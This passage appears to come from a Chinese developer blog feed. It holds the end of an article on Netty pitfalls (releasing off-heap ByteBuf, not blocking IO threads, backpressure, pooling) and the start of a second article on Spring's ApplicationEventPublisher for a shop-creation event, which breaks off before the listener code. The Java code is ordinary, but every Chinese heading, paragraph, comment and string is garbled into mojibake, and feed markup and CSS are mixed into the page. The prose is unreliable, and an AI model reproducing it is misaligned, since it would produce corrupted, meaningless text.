<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b22913522bef4000937c2c3999c6e375~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667435&amp;x-signature=YNW9u6dlMBogzaS47gGsLVU3gQg%3D" alt="" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-9">4. ç”Ÿäº§ç¯å¢ƒçš„â€œå‘â€ä¸æœ€ä½³å®è·µ</h3>
<p>Netty å¾ˆå¼ºï¼Œä½†ä¹Ÿå®¹æ˜“â€œèµ°ç«å…¥é­”â€ã€‚</p>
<h3 data-id="heading-10">4.1 å†…å­˜æ³„æ¼ï¼ˆMemory Leakï¼‰</h3>
<p>Netty é»˜è®¤ä½¿ç”¨å †å¤–å†…å­˜ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DDirect%2BMemory%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=Direct+Memory&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Direct Memory</a>ï¼‰ï¼Œè¿™éƒ¨åˆ†å†…å­˜ä¸å— JVM GC ç›´æ¥ç®¡æ§ã€‚å¦‚æœä½ ç”³è¯·äº†Â <code>ByteBuf</code>Â å´å¿˜äº†é‡Šæ”¾ï¼ŒæœåŠ¡è·‘ä¸¤å¤©å°±ä¼š OOMã€‚</p>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼šè°æœ€åä½¿ç”¨ï¼Œè°è´Ÿè´£é‡Šæ”¾ã€‚é€šå¸¸åœ¨Â <code>ChannelInboundHandler</code>Â çš„Â <code>finally</code>Â å—ä¸­ä½¿ç”¨Â <code>ReferenceCountUtil.release(msg)</code>ã€‚</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> com.howell.netty.memory;

<span class="hljs-keyword">import</span> io.netty.buffer.<span class="hljs-type">ByteBuf</span>;
<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">ChannelHandlerContext</span>;
<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">ChannelInboundHandlerAdapter</span>;
<span class="hljs-keyword">import</span> io.netty.util.<span class="hljs-type">ReferenceCountUtil</span>;

<span class="hljs-comment">/**
 * ç¤ºä¾‹ 4: æ­£ç¡®çš„å†…å­˜é‡Šæ”¾å§¿åŠ¿
 * è¿è¡Œç»“æœè¯´æ˜ï¼šé¿å…å †å¤–å†…å­˜æ³„æ¼ï¼Œç»´æŒæœåŠ¡é•¿æœŸç¨³å®šè¿è¡Œã€‚
 */</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SafeByteBufHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ChannelInboundHandlerAdapter</span> </span>{

    <span class="hljs-meta">@Override</span>
    public void channelRead(<span class="hljs-type">ChannelHandlerContext</span> ctx, <span class="hljs-type">Object</span> msg) {
        <span class="hljs-type">ByteBuf</span> buf = (<span class="hljs-type">ByteBuf</span>) msg;
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä¸šåŠ¡å¤„ç†é€»è¾‘</span>
            <span class="hljs-type">System</span>.out.println(<span class="hljs-string">"Processing: "</span> + buf.toString(io.netty.util.<span class="hljs-type">CharsetUtil</span>.<span class="hljs-type">UTF_8</span>));
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// å¿…é¡»é‡Šæ”¾ï¼å¦åˆ™ Direct Memory çˆ†æ»¡å¯¼è‡´ OOM</span>
            <span class="hljs-comment">// å¦‚æœæ¶ˆæ¯ä¼ é€’ç»™ä¸‹ä¸€ä¸ª Handlerï¼Œåˆ™ç”±ä¸‹ä¸€ä¸ª Handler é‡Šæ”¾</span>
            <span class="hljs-type">ReferenceCountUtil</span>.release(msg);
        }
    }
}
</code></pre>
<h3 data-id="heading-11">4.2 è‡´å‘½é”™è¯¯ï¼šåœ¨ IO çº¿ç¨‹åšè€—æ—¶ä¸šåŠ¡</h3>
<p><strong>è¿™æ˜¯ 90% çš„ Netty åˆå­¦è€…å’ŒæœåŠ¡ä¸ç¨³å®šçš„æ ¹æºã€‚</strong> Â Worker Group çš„çº¿ç¨‹éå¸¸å®è´µï¼ˆé€šå¸¸åªæœ‰ CPU æ ¸æ•° * 2ï¼‰ã€‚å¦‚æœä½ åœ¨Â <code>channelRead</code>Â é‡ŒæŸ¥è¯¢æ•°æ®åº“ã€è°ƒç”¨å¤–éƒ¨ HTTP æ¥å£ï¼Œå¯¼è‡´è¯¥çº¿ç¨‹é˜»å¡ 200msã€‚é‚£ä¹ˆè¿™ 200ms å†…ï¼Œè¯¥çº¿ç¨‹è´Ÿè´£çš„å…¶ä»–å‡ ç™¾ä¸ªè¿æ¥å…¨éƒ¨å¡æ­»ï¼</p>
<p><strong>é”™è¯¯ç¤ºèŒƒï¼ˆåƒä¸‡åˆ«è¿™ä¹ˆå¹²ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> com.howell.netty.pitfalls;

<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">ChannelHandlerContext</span>;
<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">SimpleChannelInboundHandler</span>;

<span class="hljs-comment">/**
 * ç¤ºä¾‹ 5: åé¢æ•™æ - é˜»å¡ IO çº¿ç¨‹
 * è¿è¡Œç»“æœè¯´æ˜ï¼šå¯¼è‡´ EventLoop é˜»å¡ï¼Œååé‡æ€¥å‰§ä¸‹é™ï¼Œé€ æˆâ€œå‡æ­»â€ç°è±¡ã€‚
 */</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BlockingHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SimpleChannelInboundHandler&lt;String&gt;</span> </span>{
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> void channelRead0(<span class="hljs-type">ChannelHandlerContext</span> ctx, <span class="hljs-type">String</span> msg) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> {
        <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œï¼Œæ¯”å¦‚ DB æŸ¥è¯¢</span>
        <span class="hljs-comment">// è¿™ä¼šå¡æ­»å½“å‰ EventLoop ä¸Šçš„æ‰€æœ‰è¿æ¥ï¼</span>
        <span class="hljs-type">Thread</span>.sleep(<span class="hljs-number">1000</span>); 
        ctx.writeAndFlush(<span class="hljs-string">"Done"</span>);
    }
}
</code></pre>
<p><strong>æ­£ç¡®å§¿åŠ¿ï¼ˆå¼‚æ­¥è§£è€¦ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> com.howell.netty.optimization;

<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">ChannelHandlerContext</span>;
<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">SimpleChannelInboundHandler</span>;
<span class="hljs-keyword">import</span> io.netty.util.concurrent.<span class="hljs-type">DefaultEventExecutorGroup</span>;
<span class="hljs-keyword">import</span> io.netty.util.concurrent.<span class="hljs-type">EventExecutorGroup</span>;

<span class="hljs-comment">/**
 * ç¤ºä¾‹ 6: æ¶æ„å¸ˆæ–¹æ¡ˆ - ä¸šåŠ¡çº¿ç¨‹æ± éš”ç¦»
 * è¿è¡Œç»“æœè¯´æ˜ï¼šIO çº¿ç¨‹åªè´Ÿè´£è¯»å†™ï¼Œä¸šåŠ¡é€»è¾‘åœ¨ç‹¬ç«‹çº¿ç¨‹æ± æ‰§è¡Œï¼Œäº’ä¸å½±å“ã€‚
 */</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AsyncBusinessHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SimpleChannelInboundHandler&lt;String&gt;</span> </span>{

    <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªä¸šåŠ¡çº¿ç¨‹æ± ï¼Œå¤„ç†è€—æ—¶ä¸šåŠ¡</span>
    static <span class="hljs-keyword">final</span> <span class="hljs-type">EventExecutorGroup</span> businessGroup = <span class="hljs-keyword">new</span> <span class="hljs-type">DefaultEventExecutorGroup</span>(<span class="hljs-number">16</span>);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> void channelRead0(<span class="hljs-type">ChannelHandlerContext</span> ctx, <span class="hljs-type">String</span> msg) {
        <span class="hljs-comment">// å°†ä»»åŠ¡æäº¤ç»™ä¸šåŠ¡çº¿ç¨‹æ± </span>
        businessGroup.submit(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ (DB, RPC)</span>
                <span class="hljs-type">Thread</span>.sleep(<span class="hljs-number">500</span>); 
                <span class="hljs-type">String</span> result = <span class="hljs-string">"Processed: "</span> + msg;
                
                <span class="hljs-comment">// æ³¨æ„ï¼šå†™å›æ•°æ®æ—¶ï¼ŒNetty çº¿ç¨‹å®‰å…¨æœºåˆ¶ä¼šè‡ªåŠ¨å¤„ç†</span>
                ctx.writeAndFlush(result);
            } <span class="hljs-keyword">catch</span> (<span class="hljs-type">InterruptedException</span> e) {
                e.printStackTrace();
            }
        });
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-12">5. æ¶æ„å¸ˆæ€ç»´æ‹“å±•ï¼šé‚ªä¿®ç‰ˆæœ¬ä¸æ·±åº¦æ€è€ƒ</h3>
<h3 data-id="heading-13">5.1 ä»€ä¹ˆæ—¶å€™ä¸éœ€è¦ Nettyï¼Ÿ</h3>
<p>å¦‚æœä½ çš„ç³»ç»Ÿæ˜¯ CRUD ç±»å‹çš„ç®¡ç†åå°ï¼Œå¹¶å‘é‡åªæœ‰å‡ ç™¾ï¼Œç›´æ¥ç”¨ Spring Boot (Tomcat) å°±è¡Œäº†ã€‚å¼•å…¥ Netty åªä¼šå¢åŠ å¤æ‚åº¦ï¼Œå¯¼è‡´å¼€å‘æˆæœ¬ä¸Šå‡ã€‚æ¶æ„å¸ˆè¦æ‡‚å¾—â€œåšå‡æ³•â€ã€‚</p>
<h3 data-id="heading-14">5.2 é‚ªä¿®æ¶æ„ï¼šNetty åšç½‘å…³çš„æµé‡æ•´å½¢</h3>
<p>æ™®é€šçš„æ¶æ„å¸ˆç”¨ Netty åšé€šä¿¡ï¼Œé«˜çº§æ¶æ„å¸ˆç”¨ Netty åš<strong>æµæ§</strong>ã€‚ Netty æä¾›äº†Â <code>WriteBufferWaterMark</code>ï¼ˆé«˜ä½æ°´ä½çº¿ï¼‰ã€‚å½“å†™ç¼“å†²åŒºçš„æ•°æ®ç§¯å‹è¶…è¿‡é«˜æ°´ä½æ—¶ï¼Œ<code>channel.isWritable()</code>Â ä¼šå˜ falseã€‚</p>
<p><strong>é‚ªä¿®æ€è·¯</strong>ï¼š ä½ å¯ä»¥ç›‘å¬è¿™ä¸ªçŠ¶æ€ï¼Œå½“å®¢æˆ·ç«¯å†™å¾—å¤ªå¿«ï¼ŒæœåŠ¡ç«¯å¤„ç†ä¸è¿‡æ¥æ—¶ï¼Œç›´æ¥æš‚åœÂ <code>read()</code>ï¼ˆå…³é—­ AutoReadï¼‰ï¼Œåˆ©ç”¨ TCP çš„æ»‘åŠ¨çª—å£æœºåˆ¶ï¼Œåå‹ï¼ˆBackpressureï¼‰ç»™å®¢æˆ·ç«¯ï¼Œè¿«ä½¿å®¢æˆ·ç«¯é™é€Ÿã€‚è¿™æ˜¯ä¿æŠ¤åç«¯æœåŠ¡ä¸è¢«å‹å®çš„ç¥æŠ€ã€‚</p>
<h3 data-id="heading-15">5.3 å†…å­˜æ± åŒ–ï¼ˆPoolingï¼‰</h3>
<p>Netty çš„Â <code>PooledByteBufAllocator</code>Â å®ç°äº†ç±»ä¼¼Â <code>jemalloc</code>Â çš„å†…å­˜åˆ†é…ç®—æ³•ã€‚åœ¨ Java è¿™ç§æœ‰ GC çš„è¯­è¨€é‡Œï¼Œæ‰‹åŠ¨ç®¡ç†å†…å­˜æ± å¬èµ·æ¥å¾ˆåäººç±»ï¼Œä½†åœ¨é«˜é¢‘ IO åœºæ™¯ä¸‹ï¼Œè¿™èƒ½æå¤§å‡å°‘ GC å‹åŠ›ã€‚</p>
<hr/>
<h3 data-id="heading-16">6. æ€»ç»“ï¼ˆTakeawayï¼‰</h3>
<p>è¯»å®Œè¿™ç¯‡æ–‡ç« ï¼Œå…³äº Nettyï¼Œä½ éœ€è¦å¸¦èµ°ä»¥ä¸‹ç»“è®ºï¼š</p>
<ol>
<li><strong>Reactor æ¨¡å‹</strong>ï¼šBoss æ¥å®¢ï¼ŒWorker ç«¯èœï¼ŒBusiness çº¿ç¨‹æ± åšèœã€‚åƒä¸‡åˆ«è®© Worker è¿›å¨æˆ¿åˆ‡èœï¼ˆé˜»å¡ï¼‰ã€‚</li>
<li><strong>é›¶æ‹·è´</strong>ï¼šèƒ½ç”¨é€»è¾‘ç»„åˆï¼ˆCompositeï¼‰å°±åˆ«ç‰©ç†æ‹·è´ï¼Œèƒ½ç”¨ OS ä¼ è¾“ï¼ˆFileRegionï¼‰å°±åˆ«è¿› JVMã€‚</li>
<li><strong>å†…å­˜ç®¡ç†</strong>ï¼šå †å¤–å†…å­˜æ˜¯æŠŠåŒåˆƒå‰‘ï¼Œå¿«ä½†æ˜¯å±é™©ï¼Œè®°å¾—Â <code>ReferenceCountUtil.release()</code>ã€‚</li>
<li><strong>æ¶æ„è§†è§’</strong>ï¼šNetty ä¸ä»…ä»…æ˜¯ç½‘ç»œåº“ï¼Œå®ƒæ˜¯å¼‚æ­¥äº‹ä»¶é©±åŠ¨æ¶æ„çš„åŸºçŸ³ã€‚</li>
</ol>
<p><strong>æ¶æ„å¸ˆçš„ä»·å€¼ï¼Œä¸åœ¨äºä½ ä¼šå†™å¤šå°‘è¡Œä»£ç ï¼Œè€Œåœ¨äºä½ èƒ½åœ¨é«˜å¹¶å‘çš„æ´ªæµä¸­ï¼Œç²¾å‡†åœ°æ§åˆ¶æ¯ä¸€ä¸ªå­—èŠ‚çš„æµåŠ¨å’Œæ¯ä¸€ä¸ªçº¿ç¨‹çš„å‘¼å¸ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨Springçš„ApplicationEventPublisherè¿›è¡Œäº‹ä»¶å‘å¸ƒå’Œç›‘å¬]]></title>    <link>https://juejin.cn/post/7597764707035381811</link>    <guid>https://juejin.cn/post/7597764707035381811</guid>    <pubDate>2026-01-22T06:20:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597764707035381811" data-draft-id="7597758250826268682" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨Springçš„ApplicationEventPublisherè¿›è¡Œäº‹ä»¶å‘å¸ƒå’Œç›‘å¬"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-22T06:20:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¥å¥‡å°æ±¤åœ†"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨Springçš„ApplicationEventPublisherè¿›è¡Œäº‹ä»¶å‘å¸ƒå’Œç›‘å¬
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¥å¥‡å°æ±¤åœ†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:20:17.000Z" title="Thu Jan 22 2026 06:20:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ¦‚è¿°</h2>
<p>æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬åªæ˜¯æƒ³å‘å¸ƒä¸€äº›æœ¬åœ°çš„äº‹ä»¶ï¼Œå¹¶ä¸éœ€è¦å¼•å…¥MQçš„ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Springçš„ApplicationEventPublisheræ¥å®Œæˆç®€å•äº‹ä»¶çš„å‘å¸ƒå’Œç›‘å¬çš„ã€‚</p>
<p>æ¯”å¦‚åƒä¸‹é¢çš„åœºæ™¯ï¼ŒApplicationEventPublisherå°±å¤Ÿç”¨äº†ã€‚</p>
<ul>
<li>æ¨¡å—é—´çš„é€»è¾‘è§£è€¦ï¼Œä½†ä¸è·¨æœåŠ¡ï¼›</li>
<li>è½»é‡çº§çš„æœ¬åœ°äº‹ä»¶é€šçŸ¥</li>
<li>åº”ç”¨å†…éƒ¨çš„è§£è€¦å’Œæ‰©å±•ç‚¹:æ¯”å¦‚è¯´åœ¨DDDé‡Œï¼Œèšåˆä¿å­˜æ•°æ®æˆåŠŸåï¼Œéœ€è¦è§¦å‘è‹¥å¹²çš„åç»­åŠ¨ä½œ</li>
<li>æ— å¼ºäº‹åŠ¡è¦æ±‚ã€æ— å¼ºæŒä¹…åŒ–è¦æ±‚çš„é€šçŸ¥åœºæ™¯</li>
</ul>
<h2 data-id="heading-1">ç”Ÿäº§ç¯å¢ƒå®æˆ˜,é—¨åº—åˆ›å»ºæˆåŠŸåå‘å¸ƒã€é—¨åº—å·²æˆåŠŸåˆ›å»ºçš„äº‹ä»¶ã€‘</h2>
<p>åœ¨æˆ‘ç›®å‰è¿™è¾¹ï¼Œé—¨åº—ä¸€æ—¦åˆ›å»ºæˆåŠŸåï¼Œæ˜¯æœ‰å¾ˆå¤šä¸€ç³»åˆ—çš„åç»­åŠ¨ä½œè¦å»åšçš„ï¼Œæ¯”å¦‚é…ç½®é—¨åº—çš„å„ç§å„æ ·çš„è§„åˆ™ä¿¡æ¯ã€‚</p>
<p>å…·ä½“çš„ä»£ç å¾ˆç®€å•ã€‚</p>
<ul>
<li>å°±æ˜¯ç”¨ApplicationEventPublisherçš„publishEventæ–¹æ³•å‘å¸ƒäº‹ä»¶</li>
<li>ç”¨EventListeneræ³¨è§£ç›‘å¬äº‹ä»¶å°±å¯ä»¥äº†ã€‚</li>
</ul>
<p>å…·ä½“çš„ä»£ç å®ç°å¦‚ä¸‹ã€‚</p>
<p><strong>äº‹ä»¶å‘å¸ƒè€…å°è£… ApplicationEventPublisher</strong></p>
<p><code>ShopCreationEventPublisher</code>Â å¯¹ Spring çš„Â <code>ApplicationEventPublisher</code>Â åšäº†ä¸€å±‚å°è£…ï¼Œç»Ÿä¸€äº‹ä»¶åˆ›å»ºå’Œæ—¥å¿—è¾“å‡ºï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Component</span>
<span class="hljs-variable">@RequiredArgsConstructor</span>
<span class="hljs-variable">@Slf4j</span>
public class ShopCreationEventPublisher {

    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">final</span> <span class="hljs-selector-tag">ApplicationEventPublisher</span> <span class="hljs-selector-tag">applicationEventPublisher</span>;

    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">publishShopCreationEvent</span>(Long shopId) {
        <span class="hljs-selector-tag">if</span> (shopId == null) {
            <span class="hljs-selector-tag">return</span>;
        }
        <span class="hljs-selector-tag">applicationEventPublisher</span><span class="hljs-selector-class">.publishEvent</span>(
                new <span class="hljs-built_in">ShopCreationEvent</span>(
                        shopId,
                        ShopConstant.ShopDomainEvent.SHOP_CREATION_EVENT.<span class="hljs-built_in">getCode</span>()
                )
        );
        <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">"Publishing {} for shopId: {}"</span>,
                ShopConstant.ShopDomainEvent.SHOP_CREATION_EVENT.<span class="hljs-built_in">getCode</span>(), shopId);
    }
}
</code></pre>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@AllArgsConstructor</span>
    <span class="hljs-variable">@Getter</span>
    public enum ShopDomainEvent {
        <span class="hljs-selector-tag">SHOP_CREATION_EVENT</span>(<span class="hljs-string">"shop_creation_event"</span>, <span class="hljs-string">"é—¨åº—å·²åˆ›å»º"</span>),
        <span class="hljs-selector-tag">SHOP_UPDATE_EVENT</span>(<span class="hljs-string">"shop_update_event"</span>, <span class="hljs-string">"é—¨åº—å·²æ›´æ–°"</span>);

        <span class="hljs-comment">/**
         * ç¼–ç 
         */</span>
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">final</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">code</span>;

        <span class="hljs-comment">/**
         * æè¿°
         */</span>
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">final</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">desc</span>;
    }
</code></pre>
<p>è¿™ä¸ªç±»åšäº†å‡ ä»¶å°äº‹ï¼š</p>
<ul>
<li><strong>å°è£…äº‹ä»¶æ„é€ </strong>ï¼šä¸Šå±‚åªéœ€è¦ä¼ Â <code>shopId</code>ï¼Œä¸å…³å¿ƒäº‹ä»¶ code çš„ç»†èŠ‚</li>
<li><strong>ShopDomainEvent</strong>ï¼šå®šä¹‰é—¨åº—çš„æ—¶é—´ï¼Œæœ‰åˆ›å»ºå’Œæ›´æ–°</li>
</ul>
<p>é€šè¿‡è¿™å±‚å°è£…ï¼Œä¸šåŠ¡ä»£ç å‡ ä¹å®Œå…¨ä¸Â <code>ApplicationEventPublisher</code>Â è§£è€¦ï¼Œåªä¾èµ–ä¸€ä¸ªè¯­ä¹‰æ˜ç¡®çš„å‘å¸ƒå™¨ã€‚ShopApplicationServiceç±»åªéœ€è¦è°ƒç”¨å‘å¸ƒæ–¹æ³•ï¼Œäº‹ä»¶å°±å‘å¸ƒå‡ºå»äº†ã€‚</p>
<pre><code class="hljs language-less" lang="less"> <span class="hljs-variable">@RequiredArgsConstructor</span>
<span class="hljs-variable">@Service</span>
<span class="hljs-variable">@Slf4j</span>
public class ShopApplicationService {
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">final</span> <span class="hljs-selector-tag">ShopCreationEventPublisher</span> <span class="hljs-selector-tag">shopCreationEventPublisher</span>;


    <span class="hljs-comment">/**
     * ä¿å­˜é—¨åº—èšåˆä¿¡æ¯
     */</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">saveShopInfo</span>(SaveShopInfoCommand saveShopInfoCommand) {
        <span class="hljs-comment">// æ„å»ºèšåˆæ ¹</span>
        <span class="hljs-selector-tag">ShopInfoAggregateRoot</span> <span class="hljs-selector-tag">root</span> = <span class="hljs-selector-tag">shopInfoFactory</span><span class="hljs-selector-class">.createShopInfoAggregateRoot</span>(saveShopInfoCommand);

        <span class="hljs-comment">// æŒä¹…åŒ–</span>
        <span class="hljs-selector-tag">shopInfoRepository</span><span class="hljs-selector-class">.persistence</span>(root);

        <span class="hljs-comment">// å‘å¸ƒã€é—¨åº—å·²åˆ›å»ºã€‘çš„äº‹ä»¶</span>
     
        <span class="hljs-selector-tag">shopCreationEventPublisher</span><span class="hljs-selector-class">.publishShopCreationEvent</span>(root.<span class="hljs-built_in">getId</span>());
    }
}
</code></pre>
<p><strong>äº‹ä»¶ç›‘å¬è€…å®ç°</strong></p>
